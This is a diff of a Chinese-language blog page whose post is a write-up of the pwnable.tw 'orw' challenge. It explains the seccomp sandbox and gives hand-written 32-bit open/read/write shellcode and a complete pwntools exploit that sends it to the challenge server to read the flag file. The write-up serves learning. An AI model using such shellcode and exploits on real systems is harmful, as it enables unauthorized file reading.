@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x01 IDA分析拿到程序不多bb，首先DIE看一波文件类型，发现是gcc编译的32位的文件，没加壳。直接拖进IDA，发现前面有个seccomp函数，并不知道做了什么操作，先不管，继续往下看，发现有个直接往bss上写shellcode，然后执行shellcode的操作。   0x02 SECCOMPEXP写完后跑了一下发下并没有弹shell，奇怪，进去跟了一下，发现int 80调用execve执">
@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://driverxdw.github.io/2019/04/17/Pwnable-tw-orw/getshell.png">
 <meta property="article:published_time" content="2019-04-16T16:18:51.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.408Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -148,29 +148,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -208,7 +188,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -222,7 +204,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -236,6 +217,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -268,8 +259,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2019/04/17/Pwnable-tw-orw/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -312,6 +303,13 @@
     </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -321,20 +319,20 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>拿到程序不多bb，首先DIE看一波文件类型，发现是gcc编译的32位的文件，没加壳。直接拖进IDA，发现前面有个seccomp函数，并不知道做了什么操作，先不管，继续往下看，发现有个直接往bss上写shellcode，然后执行shellcode的操作。  </p>
+        <h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>拿到程序不多bb，首先DIE看一波文件类型，发现是gcc编译的32位的文件，没加壳。直接拖进IDA，发现前面有个seccomp函数，并不知道做了什么操作，先不管，继续往下看，发现有个直接往bss上写shellcode，然后执行shellcode的操作。  </p>
 <h2 id="0x02-SECCOMP"><a href="#0x02-SECCOMP" class="headerlink" title="0x02 SECCOMP"></a>0x02 SECCOMP</h2><p>EXP写完后跑了一下发下并没有弹shell，奇怪，进去跟了一下，发现int 80调用execve执行/bin/sh后一条指令报错，怀疑是shellcode的原因，更换了几个shellcode发现仍然不行，这时猜测是SECCOMP的原因，查了一下发现这是个类似黑白名单的东西，把一些危险函数过滤掉，在pwn题中此工具做沙箱保护很常见，通常禁用一部分syscall，比如execve等，这样就没法直接弹shell了。<a id="more"></a>    </p>
 <h2 id="0x03-How-to-reverse"><a href="#0x03-How-to-reverse" class="headerlink" title="0x03 How to reverse"></a>0x03 How to reverse</h2><p>在这个成熟的保护机制下衍生了很多逆向工具，这边使用的是<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">Seccomp-tools</a>，看下效果。<br><img src="./seccomp-tools.png" alt="image">  </p>
 <p>可以看到程序只允许执行open、read、write、exit等函数，直接syscall或者execve是不被允许的，所以此题只能在open、read、write这三个函数的基础上去思考如何利用。  </p>
 <h2 id="0x04-Shellcode"><a href="#0x04-Shellcode" class="headerlink" title="0x04 Shellcode"></a>0x04 Shellcode</h2><p>虽然不能直接写execve弹shell，但是换个思路利用open打开文件句柄，read在打开的文件描述符上进行读取，之后用write输出到标准输出仍然可以达到一样的效果。<br>这边根据<a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">Linux下的系统调用编号</a>进行编写shellcode。<br>shellcode如下：</p>
-<figure class="highlight properties hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">shellcode</span>=<span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">eax,5</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x00006761</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x6c662f77</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x726f2f65</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x6d6f682f</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ebx,esp</span></span><br><span class="line"><span class="hljs-attr">xor</span> <span class="hljs-string">ecx,ecx</span></span><br><span class="line"><span class="hljs-attr">xor</span> <span class="hljs-string">edx,edx</span></span><br><span class="line"><span class="hljs-attr">int</span> <span class="hljs-string">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">eax,3</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ecx,ebx</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ebx,3</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">edx,0x40</span></span><br><span class="line"><span class="hljs-attr">int</span> <span class="hljs-string">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">eax,4</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ebx,1</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">edx,0x40</span></span><br><span class="line"><span class="hljs-attr">int</span> <span class="hljs-string">0x80</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">shellcode</span>=<span class="string">"""</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">eax,5</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x00006761</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x6c662f77</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x726f2f65</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x6d6f682f</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ebx,esp</span></span><br><span class="line"><span class="attr">xor</span> <span class="string">ecx,ecx</span></span><br><span class="line"><span class="attr">xor</span> <span class="string">edx,edx</span></span><br><span class="line"><span class="attr">int</span> <span class="string">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mov</span> <span class="string">eax,3</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ecx,ebx</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ebx,3</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">edx,0x40</span></span><br><span class="line"><span class="attr">int</span> <span class="string">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mov</span> <span class="string">eax,4</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ebx,1</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">edx,0x40</span></span><br><span class="line"><span class="attr">int</span> <span class="string">0x80</span></span><br></pre></td></tr></table></figure>
 
 <p>open那里把路径压栈后把esp值赋给ebx，open函数打开一个文件句柄，存储在eax中，read函数从eax中存储的句柄进行读取。  </p>
 <h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05 EXP"></a>0x05 EXP</h2><p>这边贴下完整的EXP：</p>
-<figure class="highlight properties hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">from</span> <span class="hljs-string">pwn import *</span></span><br><span class="line"><span class="hljs-meta">context(log_level</span>=<span class="hljs-string">'debug',arch='i386',os='linux')</span></span><br><span class="line"><span class="hljs-attr">p</span>=<span class="hljs-string">remote('chall.pwnable.tw',10001)</span></span><br><span class="line"><span class="hljs-meta">p.recvuntil('</span>:<span class="hljs-string">')</span></span><br><span class="line"><span class="hljs-attr">shellcode</span>=<span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">eax,5;</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x00006761;</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x6c662f77;</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x726f2f65;</span></span><br><span class="line"><span class="hljs-attr">push</span> <span class="hljs-string">0x6d6f682f;</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ebx,esp;</span></span><br><span class="line"><span class="hljs-attr">xor</span> <span class="hljs-string">ecx,ecx;</span></span><br><span class="line"><span class="hljs-attr">xor</span> <span class="hljs-string">edx,edx;</span></span><br><span class="line"><span class="hljs-attr">int</span> <span class="hljs-string">0x80;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">eax,3;</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ecx,ebx;</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ebx,eax;</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">edx,0x40;</span></span><br><span class="line"><span class="hljs-attr">int</span> <span class="hljs-string">0x80;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">eax,4;</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">ebx,1;</span></span><br><span class="line"><span class="hljs-attr">mov</span> <span class="hljs-string">edx,0x40;</span></span><br><span class="line"><span class="hljs-attr">int</span> <span class="hljs-string">0x80;</span></span><br><span class="line"><span class="hljs-attr">"""</span></span><br><span class="line"><span class="hljs-attr">p.sendline(asm(shellcode))</span></span><br><span class="line"><span class="hljs-attr">p.interactive()</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">from</span> <span class="string">pwn import *</span></span><br><span class="line"><span class="meta">context(log_level</span>=<span class="string">'debug',arch='i386',os='linux')</span></span><br><span class="line"><span class="attr">p</span>=<span class="string">remote('chall.pwnable.tw',10001)</span></span><br><span class="line"><span class="meta">p.recvuntil('</span>:<span class="string">')</span></span><br><span class="line"><span class="attr">shellcode</span>=<span class="string">"""</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">eax,5;</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x00006761;</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x6c662f77;</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x726f2f65;</span></span><br><span class="line"><span class="attr">push</span> <span class="string">0x6d6f682f;</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ebx,esp;</span></span><br><span class="line"><span class="attr">xor</span> <span class="string">ecx,ecx;</span></span><br><span class="line"><span class="attr">xor</span> <span class="string">edx,edx;</span></span><br><span class="line"><span class="attr">int</span> <span class="string">0x80;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mov</span> <span class="string">eax,3;</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ecx,ebx;</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ebx,eax;</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">edx,0x40;</span></span><br><span class="line"><span class="attr">int</span> <span class="string">0x80;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mov</span> <span class="string">eax,4;</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">ebx,1;</span></span><br><span class="line"><span class="attr">mov</span> <span class="string">edx,0x40;</span></span><br><span class="line"><span class="attr">int</span> <span class="string">0x80;</span></span><br><span class="line"><span class="attr">"""</span></span><br><span class="line"><span class="attr">p.sendline(asm(shellcode))</span></span><br><span class="line"><span class="attr">p.interactive()</span></span><br></pre></td></tr></table></figure>
 
 <p>看到有dalao直接用pwntools的shellcraft模块做的，羡慕一波<br><img src="./shellcraft.png" alt="image">  </p>
 <h2 id="0x06-GetFlag"><a href="#0x06-GetFlag" class="headerlink" title="0x06 GetFlag"></a>0x06 GetFlag</h2><p>不过最终还是拿到了Flag，这道题主要就是一个SECCOMP需要注意下，还有就是如果是手写shellcode，需要注意syscall的调用号。<br><img src="./getshell.png" alt="image">  </p>
-</body></html>
+
     </div>
 
     
@@ -409,10 +407,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -438,6 +466,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
